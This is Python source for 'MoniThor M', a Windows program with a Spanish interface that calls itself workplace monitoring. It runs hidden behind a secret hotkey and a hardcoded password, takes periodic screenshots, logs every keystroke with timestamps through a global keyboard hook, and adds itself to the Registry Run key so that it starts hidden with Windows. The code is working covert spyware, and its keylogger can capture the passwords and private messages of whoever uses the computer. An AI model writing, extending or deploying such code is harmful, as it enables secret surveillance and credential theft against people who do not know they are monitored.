import os
import time
import threading
from datetime import datetime, date
import customtkinter as ctk
from tkinter import filedialog, messagebox
import pyautogui
import keyboard
import sys
import winreg as reg

# --- VERSION DE SOFTWARE V2.0---

# --- CONFIGURACIÓN DE SEGURIDAD ---
CONTRASENA_ACCESO = "7710"  
COMBINACION_TECLAS = "ctrl+alt+m"  

# --- LISTA DE 50 SERIALES VÁLIDOS ---
SERIALES_VALIDOS = [
    "7xKqW2", "M9bVf1", "z4RnP8", "tG7mK5", "X2vYh9", "L6wBf3", "p8N1vG", "k4XmW9", "Z3vRj5", "H8fLq2",
    "c1M9xV", "F7nTz4", "r2G6hK", "W9vPj3", "b5XmN1", "Y8kTz4", "v3RfG9", "h6M1xK", "P7vNq2", "z4XmW8",
    "G9fTj1", "c3KbV5", "R8vNq2", "m1XfK7", "V9hTj4", "k2BmN6", "Z8fLq3", "x1M5vG", "H7nTz2", "r4KbV9",
    "W6vPj1", "b3XmN8", "Y9kTz5", "v2RfG4", "h7M1xK", "P8vNq3", "z5XmW9", "G1fTj6", "c4KbV2", "R9vNq5",
    "m2XfK8", "V1hTj7", "k3BmN4", "Z9fLq5", "x2M6vG", "H8nTz5", "r5KbV1", "W7vPj3", "771077", "Y1kTz6"
]

# --- RUTA POR DEFECTO ---
CARPETA_DEFAULT = os.path.join(os.path.expanduser("~"), "Desktop", "Capturas")

# --- CLAVES DEL REGISTRO ---
REG_RUTA_BASE = r"Software\MoniThorM"
REG_KEY_ACTIVADO = "Activado"
REG_KEY_CARPETA = "CarpetaDestino"
REG_KEY_INTERVALO = "IntervaloSegundos"
REG_KEY_INICIO_AUTO = "InicioAutomatico"


class MonitorApp:
    def __init__(self):
        self.monitoreando = False
        self.intervalo_segundos = 10
        self.hilo_captura = None
        self.ventana_login = None  
        self.keylogger_activo = False
        self.buffer_teclas = []
        self.hilo_keylogger = None
        self.teclas_presionadas = 0
        self.reporte_actual = None

        self.tiempos_map = {
            "3 segundos": 3, "5 segundos": 5, "10 segundos": 10, "15 segundos": 15,
            "30 segundos": 30, "60 segundos": 60, "1.5 minutos": 90, "3 minutos": 180,
            "5 minutos": 300, "10 minutos": 600, "15 minutos": 900, "30 minutos": 1800,
            "60 minutos": 3600, "120 minutos": 7200
        }

        # --- CARGAR CONFIGURACIÓN GUARDADA ---
        self.cargar_configuracion()

        ctk.set_appearance_mode("dark")
        self.root = ctk.CTk()
        self.root.title("MoniThor M - Panel de Control")
        self.root.geometry("520x520")
        self.root.resizable(False, False)

        self.crear_interfaz_pestanas()
        self.root.withdraw()

        # --- VERIFICACIÓN DE ACTIVACIÓN LOCAL ---
        if not self.verificar_activacion_local():
            self.pedir_serial_activacion()
        else:
            keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
            self.root.mainloop()

    # ==================== PERSISTENCIA DE CONFIGURACIÓN ====================

    def cargar_configuracion(self):
        """Carga la configuración guardada del registro de Windows"""
        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)

            # Cargar carpeta destino
            try:
                carpeta, _ = reg.QueryValueEx(clave, REG_KEY_CARPETA)
                self.carpeta_destino = carpeta
            except FileNotFoundError:
                self.carpeta_destino = CARPETA_DEFAULT

            # Cargar intervalo
            try:
                intervalo, _ = reg.QueryValueEx(clave, REG_KEY_INTERVALO)
                self.intervalo_segundos = int(intervalo)
            except FileNotFoundError:
                self.intervalo_segundos = 10

            # Cargar inicio automático
            try:
                inicio_auto, _ = reg.QueryValueEx(clave, REG_KEY_INICIO_AUTO)
                self.inicio_automatico_guardado = (inicio_auto == "True")
            except FileNotFoundError:
                self.inicio_automatico_guardado = False

            reg.CloseKey(clave)
        except FileNotFoundError:
            # Primera vez que se ejecuta, usar valores por defecto
            self.carpeta_destino = CARPETA_DEFAULT
            self.intervalo_segundos = 10
            self.inicio_automatico_guardado = False

    def guardar_configuracion(self):
        """Guarda la configuración actual en el registro de Windows"""
        try:
            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE)
            reg.SetValueEx(clave, REG_KEY_CARPETA, 0, reg.REG_SZ, self.carpeta_destino)
            reg.SetValueEx(clave, REG_KEY_INTERVALO, 0, reg.REG_SZ, str(self.intervalo_segundos))
            reg.SetValueEx(clave, REG_KEY_INICIO_AUTO, 0, reg.REG_SZ, "True" if self.inicio_automatico_guardado else "False")
            reg.CloseKey(clave)
            return True
        except Exception as e:
            print(f"Error guardando configuración: {e}")
            return False

    def verificar_activacion_local(self):
        """Verifica en el registro de Windows si el programa ya fue activado en esta PC"""
        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
            valor, _ = reg.QueryValueEx(clave, REG_KEY_ACTIVADO)
            reg.CloseKey(clave)
            return valor == "True"
        except FileNotFoundError:
            return False

    def guardar_activacion_local(self):
        """Guarda de forma permanente la marca de activación en el registro de Windows"""
        try:
            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE)
            reg.SetValueEx(clave, REG_KEY_ACTIVADO, 0, reg.REG_SZ, "True")
            reg.CloseKey(clave)
            return True
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo guardar la activación en el sistema: {e}")
            return False

    def pedir_serial_activacion(self):
        """Muestra una ventana obligatoria para ingresar el número de serie en el primer inicio"""
        self.ventana_serial = ctk.CTkToplevel(self.root)
        self.ventana_serial.title("Activación de Licencia")
        self.ventana_serial.geometry("400x220")
        self.ventana_serial.resizable(False, False)
        self.ventana_serial.attributes("-topmost", True)

        self.ventana_serial.protocol("WM_DELETE_WINDOW", lambda: sys.exit())

        lbl_info = ctk.CTkLabel(self.ventana_serial, text="MoniThor M - Licencia Requerida", font=("Arial", 16, "bold"))
        lbl_info.pack(pady=15)

        lbl_instruccion = ctk.CTkLabel(self.ventana_serial, text="Por favor, introduce tu número de serie de activación:", font=("Arial", 12))
        lbl_instruccion.pack(pady=5)

        self.txt_serial = ctk.CTkEntry(self.ventana_serial, width=280, justify="center", font=("Arial", 14))
        self.txt_serial.pack(pady=10)
        self.txt_serial.focus()

        btn_activar = ctk.CTkButton(self.ventana_serial, text="Activar Software", fg_color="green", hover_color="darkgreen", command=self.validar_serial)
        btn_activar.pack(pady=10)

        self.root.mainloop()

    def validar_serial(self):
        serial_ingresado = self.txt_serial.get().strip()

        if serial_ingresado in SERIALES_VALIDOS:
            if self.guardar_activacion_local():
                messagebox.showinfo("Éxito", "Software activado correctamente de forma permanente.")
                self.ventana_serial.destroy()
                keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
            else:
                sys.exit()
        else:
            messagebox.showerror("Error de Licencia", "El número de serie introducido no es válido o ya caducó.")
            self.ventana_serial.attributes("-topmost", True)

    def crear_interfaz_pestanas(self):
        self.tabview = ctk.CTkTabview(self.root, width=480, height=440)
        self.tabview.pack(pady=10, padx=10)

        self.tabview.add("Monitoreo")
        self.tabview.add("Keylogger")
        self.tabview.add("Configuración")
        self.tabview.add("Acerca de...")

        # --- PESTAÑA 1: MONITOREO ---
        lbl_titulo = ctk.CTkLabel(self.tabview.tab("Monitoreo"), text="Control de Actividad Laboral", font=("Arial", 18, "bold"))
        lbl_titulo.pack(pady=15)

        self.lbl_estado = ctk.CTkLabel(self.tabview.tab("Monitoreo"), text="ESTADO: APAGADO", text_color="red", font=("Arial", 16, "bold"))
        self.lbl_estado.pack(pady=10)

        self.btn_inicio = ctk.CTkButton(self.tabview.tab("Monitoreo"), text="Iniciar Monitoreo", fg_color="green", hover_color="darkgreen", height=40, font=("Arial", 14, "bold"), command=self.alternar_monitoreo)
        self.btn_inicio.pack(pady=20, fill="x", padx=40)

        btn_ocultar = ctk.CTkButton(self.tabview.tab("Monitoreo"), text="Ocultar (Segundo Plano)", fg_color="gray", command=self.ocultar_ventana)
        btn_ocultar.pack(pady=10)

        # --- PESTAÑA 2: KEYLOGGER ---
        lbl_titulo_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Registro de Actividad de Teclado", font=("Arial", 18, "bold"))
        lbl_titulo_key.pack(pady=15)

        self.lbl_estado_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="KEYLOGGER: APAGADO", text_color="red", font=("Arial", 16, "bold"))
        self.lbl_estado_key.pack(pady=10)

        self.lbl_contador = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Teclas registradas hoy: 0", font=("Arial", 12))
        self.lbl_contador.pack(pady=5)

        self.btn_keylogger = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue", height=40, font=("Arial", 14, "bold"), command=self.alternar_keylogger)
        self.btn_keylogger.pack(pady=15, fill="x", padx=40)

        btn_reporte = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Ver Reporte de Hoy", fg_color="purple", hover_color="darkmagenta", height=35, font=("Arial", 12), command=self.ver_reporte_hoy)
        btn_reporte.pack(pady=10)

        btn_abrir_logs = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Abrir Carpeta de Logs", fg_color="gray", command=self.abrir_carpeta_logs)
        btn_abrir_logs.pack(pady=10)

        # --- PESTAÑA 3: CONFIGURACIÓN ---
        lbl_tiempo = ctk.CTkLabel(self.tabview.tab("Configuración"), text="Intervalo de capturas de pantalla:", font=("Arial", 13, "bold"))
        lbl_tiempo.pack(anchor="w", padx=20, pady=(10, 2))

        self.combo_tiempo = ctk.CTkOptionMenu(self.tabview.tab("Configuración"), values=list(self.tiempos_map.keys()), command=self.cambiar_tiempo)

        # Restaurar el intervalo guardado
        intervalo_guardado = self._obtener_nombre_intervalo(self.intervalo_segundos)
        self.combo_tiempo.set(intervalo_guardado)
        self.combo_tiempo.pack(fill="x", padx=20, pady=5)

        lbl_ruta = ctk.CTkLabel(self.tabview.tab("Configuración"), text="Carpeta de destino para las imágenes:", font=("Arial", 13, "bold"))
        lbl_ruta.pack(anchor="w", padx=20, pady=(15, 2))

        frame_carpeta = ctk.CTkFrame(self.tabview.tab("Configuración"), fg_color="transparent")
        frame_carpeta.pack(fill="x", padx=10, pady=5)

        self.entry_carpeta = ctk.CTkEntry(frame_carpeta, width=320)
        self.entry_carpeta.insert(0, self.carpeta_destino)
        self.entry_carpeta.pack(side="left", padx=5)

        btn_buscar = ctk.CTkButton(frame_carpeta, text="Examinar...", width=100, command=self.seleccionar_carpeta)
        btn_buscar.pack(side="right", padx=5)

        # Info sobre ubicación de logs
        lbl_info_logs = ctk.CTkLabel(self.tabview.tab("Configuración"), text="📁 Los logs de teclado se guardarán en: [Carpeta]/Logs_Teclado/", font=("Arial", 11), text_color="gray")
        lbl_info_logs.pack(pady=(5, 0))

        self.check_inicio = ctk.CTkCheckBox(self.tabview.tab("Configuración"), text="Iniciar de forma oculta con Windows")

        # Restaurar estado del checkbox de inicio automático
        if self.inicio_automatico_guardado:
            self.check_inicio.select()

        self.check_inicio.pack(pady=15)
        self.check_inicio.configure(command=self.configurar_inicio_automatico)

        # --- PESTAÑA 4: ACERCA DE... ---
        frame_creditos = ctk.CTkFrame(self.tabview.tab("Acerca de..."))
        frame_creditos.pack(fill="both", expand=True, padx=15, pady=15)

        fecha_hoy = datetime.now().strftime("%d/%m/%Y")

        info_texto = (
            f"Programa: MoniThor M\n"
            f"Descripción: Software de monitoreo laboral en Python que realiza capturas de pantalla automáticas cada cierto tiempo.\n\n"
            f"Creador: Attack7710 - Desarrollador\n"
            f"Versión: V2.0 (Nuevas funcionalidades)\n"
            f"Ubicación: Bolivia\n"
            f"Contacto: +591 69856525\n"
            f"Fecha: {fecha_hoy}"
        )

        lbl_info = ctk.CTkLabel(frame_creditos, text=info_texto, font=("Arial", 13), justify="left", wraplength=420)
        lbl_info.pack(pady=15, padx=15, anchor="w")

        self.root.protocol("WM_DELETE_WINDOW", self.ocultar_ventana)

    def _obtener_nombre_intervalo(self, segundos):
        """Devuelve el nombre legible del intervalo dado su valor en segundos"""
        for nombre, valor in self.tiempos_map.items():
            if valor == segundos:
                return nombre
        return "10 segundos"  # Default

    # ==================== MÉTODOS DEL KEYLOGGER ====================

    def _obtener_carpeta_dia(self):
        fecha=datetime.now().strftime("%d-%m-%Y")
        carpeta_base=self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
        ruta=os.path.join(carpeta_base,fecha)
        os.makedirs(ruta, exist_ok=True)
        return ruta

    def _obtener_ruta_logs(self):
        """Devuelve la ruta de la subcarpeta Logs_Teclado dentro de la carpeta de capturas actual"""
        carpeta_base = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
        fecha = datetime.now().strftime("%d-%m-%Y")
        ruta=os.path.join(carpeta_base,"Logs_Teclado",fecha)
        os.makedirs(ruta, exist_ok=True)
        return ruta

    def alternar_keylogger(self):
        if not self.keylogger_activo:
            # Crear carpeta de logs dentro de la carpeta de capturas
            ruta_logs = self._obtener_ruta_logs()
            if not os.path.exists(ruta_logs):
                try:
                    os.makedirs(ruta_logs)
                except Exception as e:
                    messagebox.showerror("Error", f"No se pudo crear la carpeta de logs: {e}")
                    return

            self.keylogger_activo = True
            self.teclas_presionadas = 0
            self.buffer_teclas = []
            self.reporte_actual = self._obtener_ruta_reporte()

            self.lbl_estado_key.configure(text="KEYLOGGER: ACTIVO", text_color="green")
            self.btn_keylogger.configure(text="Detener Keylogger", fg_color="red", hover_color="darkred")

            # Iniciar el hilo del keylogger
            self.hilo_keylogger = threading.Thread(target=self._bucle_keylogger, daemon=True)
            self.hilo_keylogger.start()

            # Escribir encabezado del reporte diario
            self._escribir_encabezado_reporte()

        else:
            self.keylogger_activo = False
            self.lbl_estado_key.configure(text="KEYLOGGER: APAGADO", text_color="red")
            self.btn_keylogger.configure(text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue")

            # Guardar lo que quede en el buffer
            self._guardar_buffer()

    def _obtener_ruta_reporte(self):
        ruta_logs=self._obtener_ruta_logs()
        return os.path.join(ruta_logs,"Reporte_Teclado.txt")

    def _escribir_encabezado_reporte(self):
        encabezado = (
            f"{'='*60}\n"
            f"  MONITHOR M - REPORTE DIARIO DE ACTIVIDAD DE TECLADO\n"
            f"  Fecha: {date.today().strftime('%d/%m/%Y')}\n"
            f"  Inicio de registro: {datetime.now().strftime('%H:%M:%S')}\n"
            f"  Carpeta de capturas: {self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino}\n"
            f"{'='*60}\n\n"
        )
        with open(self.reporte_actual, 'a', encoding='utf-8') as f:
            f.write(encabezado)

    def _procesar_tecla(self, evento):
        try:
            nombre_tecla = evento.name

            # Mapeo de teclas especiales para legibilidad
            teclas_especiales = {
                'space': ' ',
                'enter': '\n[ENTER]\n',
                'tab': '\t',
                'backspace': '[BORRAR]',
                'delete': '[SUPR]',
                'shift': '[SHIFT]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]',
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'up': '[↑]',
                'down': '[↓]',
                'left': '[←]',
                'right': '[→]',
                'print screen': '[PANTALLA]',
                'num lock': '[NUM_LOCK]',
                'scroll lock': '[SCROLL_LOCK]',
                'pause': '[PAUSA]',
                'insert': '[INSERT]',
                'home': '[INICIO]',
                'end': '[FIN]',
                'page up': '[RE_PAG]',
                'page down': '[AV_PAG]',
            }

            tecla_final = teclas_especiales.get(nombre_tecla.lower(), nombre_tecla)

            # Registrar con timestamp
            timestamp = datetime.now().strftime("%H:%M:%S")

            # Acumular en buffer (cada 20 teclas o cada 30 segundos se guarda)
            self.buffer_teclas.append(f"[{timestamp}] {tecla_final}")
            self.teclas_presionadas += 1

            # Actualizar contador en la interfaz
            self.lbl_contador.configure(text=f"Teclas registradas hoy: {self.teclas_presionadas}")

            # Guardar buffer cuando se acumulen 20 teclas
            if len(self.buffer_teclas) >= 20:
                self._guardar_buffer()

        except Exception:
            pass

    def _guardar_buffer(self):
        if not self.buffer_teclas:
            return

        try:
            with open(self.reporte_actual, 'a', encoding='utf-8') as f:
                for entrada in self.buffer_teclas:
                    f.write(entrada + '\n')
            self.buffer_teclas = []
        except Exception:
            pass

    def _bucle_keylogger(self):
        # Registrar el hook de teclado
        keyboard.on_press(self._procesar_tecla)

        ultimo_flush = time.time()

        while self.keylogger_activo:
            time.sleep(1)
            # Guardar buffer cada 30 segundos aunque no se llene
            if time.time() - ultimo_flush >= 30:
                self._guardar_buffer()
                ultimo_flush = time.time()

            # Verificar si cambió el día (nuevo reporte)
            nueva_ruta = self._obtener_ruta_reporte()
            if nueva_ruta != self.reporte_actual:
                self._guardar_buffer()  # Guardar lo pendiente del día anterior
                self.reporte_actual = nueva_ruta
                self._escribir_encabezado_reporte()
                self.teclas_presionadas = 0
                self.lbl_contador.configure(text="Teclas registradas hoy: 0")

        # Al detener, quitar el hook
        keyboard.unhook_all()

    def ver_reporte_hoy(self):
        ruta_hoy = self._obtener_ruta_reporte()
        if os.path.exists(ruta_hoy):
            try:
                with open(ruta_hoy, 'r', encoding='utf-8') as f:
                    contenido = f.read()

                # Ventana para mostrar el reporte
                ventana_reporte = ctk.CTkToplevel(self.root)
                ventana_reporte.title(f"Reporte del Día - {date.today().strftime('%d/%m/%Y')}")
                ventana_reporte.geometry("600x500")
                ventana_reporte.resizable(True, True)

                texto = ctk.CTkTextbox(ventana_reporte, width=580, height=450, font=("Consolas", 11))
                texto.pack(pady=10, padx=10, fill="both", expand=True)
                texto.insert("1.0", contenido)
                texto.configure(state="disabled")

            except Exception as e:
                messagebox.showerror("Error", f"No se pudo leer el reporte: {e}")
        else:
            messagebox.showinfo("Sin datos", "No hay registro de actividad para el día de hoy.")

    def abrir_carpeta_logs(self):
        ruta_logs = self._obtener_ruta_logs()
        if os.path.exists(ruta_logs):
            os.startfile(ruta_logs)
        else:
            messagebox.showinfo("Sin logs", "La carpeta de logs aún no existe. Inicia el keylogger primero.")

    # ==================== MÉTODOS EXISTENTES ====================

    def mostrar_ventana_autenticacion(self):
        if self.root.winfo_viewable() or (self.ventana_login and self.ventana_login.winfo_exists()):
            return

        self.ventana_login = ctk.CTkToplevel(self.root)
        self.ventana_login.title("Acceso Protegido")
        self.ventana_login.geometry("350x200")
        self.ventana_login.resizable(False, False)
        self.ventana_login.attributes("-topmost", True)

        lbl_indicacion = ctk.CTkLabel(self.ventana_login, text="Introduce la contraseña para acceder:", font=("Arial", 14, "bold"))
        lbl_indicacion.pack(pady=20)

        self.txt_password = ctk.CTkEntry(self.ventana_login, width=200, show="*", justify="center", font=("Arial", 16))
        self.txt_password.pack(pady=5)
        self.txt_password.focus()
        self.txt_password.bind("<Return>", lambda event: self.verificar_contrasena())

        btn_verificar = ctk.CTkButton(self.ventana_login, text="Entrar", width=120, command=self.verificar_contrasena)
        btn_verificar.pack(pady=15)

    def verificar_contrasena(self):
        if self.txt_password.get() == CONTRASENA_ACCESO:
            self.ventana_login.destroy()  
            self.root.deiconify()         
        else:
            messagebox.showerror("Error", "Contraseña incorrecta. Acceso denegado.")
            self.ventana_login.attributes("-topmost", True)

    def ocultar_ventana(self):
        self.root.withdraw()

    def seleccionar_carpeta(self):
        carpeta = filedialog.askdirectory()
        if carpeta:
            self.carpeta_destino = carpeta
            self.entry_carpeta.delete(0, "end")
            self.entry_carpeta.insert(0, carpeta)
            # Guardar la nueva carpeta en el registro
            self.guardar_configuracion()

    def cambiar_tiempo(self, valor_seleccionado):
        self.intervalo_segundos = self.tiempos_map[valor_seleccionado]
        # Guardar el nuevo intervalo en el registro
        self.guardar_configuracion()

    def alternar_monitoreo(self):
        if not self.monitoreando:
            self.carpeta_destino = self.entry_carpeta.get()
            if not os.path.exists(self.carpeta_destino):
                try:
                    os.makedirs(self.carpeta_destino)
                except Exception as e:
                    messagebox.showerror("Error", f"No se pudo crear la carpeta: {e}")
                return
            self.monitoreando = True
            self.lbl_estado.configure(text="ESTADO: MONITOREANDO", text_color="green")
            self.btn_inicio.configure(text="Detener Monitoreo", fg_color="red", hover_color="darkred")
            self.hilo_captura = threading.Thread(target=self.bucle_capturas, daemon=True)
            self.hilo_captura.start()
        else:
            self.monitoreando = False
            self.lbl_estado.configure(text="ESTADO: APAGADO", text_color="red")
            self.btn_inicio.configure(text="Iniciar Monitoreo", fg_color="green", hover_color="darkgreen")

    def bucle_capturas(self):
        while self.monitoreando:
            try:
                carpeta_dia=self._obtener_carpeta_dia()
                hora=datetime.now().strftime("%H-%M-%S")
                ruta_completa=os.path.join(carpeta_dia,f"captura_{hora}.png")
                pyautogui.screenshot().save(ruta_completa)
            except:
                pass
            time.sleep(self.intervalo_segundos)

    def configurar_inicio_automatico(self):
        clave_ruta = r"Software\Microsoft\Windows\CurrentVersion\Run"
        nombre_app = "MoniThorM_Oculto"
        ruta_script = os.path.abspath(sys.argv[0])

        # Actualizar estado guardado
        self.inicio_automatico_guardado = (self.check_inicio.get() == 1)
        self.guardar_configuracion()

        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_ruta, 0, reg.KEY_SET_VALUE)
            if self.check_inicio.get() == 1:
                if ruta_script.endswith('.exe'):
                    reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{ruta_script}"')
                else:
                    reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{sys.executable}" "{ruta_script}"')
                messagebox.showinfo("Inicio Automático", "Configurado con éxito.")
            else:
                try:
                    reg.DeleteValue(clave, nombre_app)
                    messagebox.showinfo("Inicio Automático", "Removido con éxito.")
                except FileNotFoundError:
                    pass
                reg.CloseKey(clave)
        except Exception as e:
            messagebox.showerror("Error", f"Error de registro: {e}")

if __name__ == "__main__":
    MonitorApp()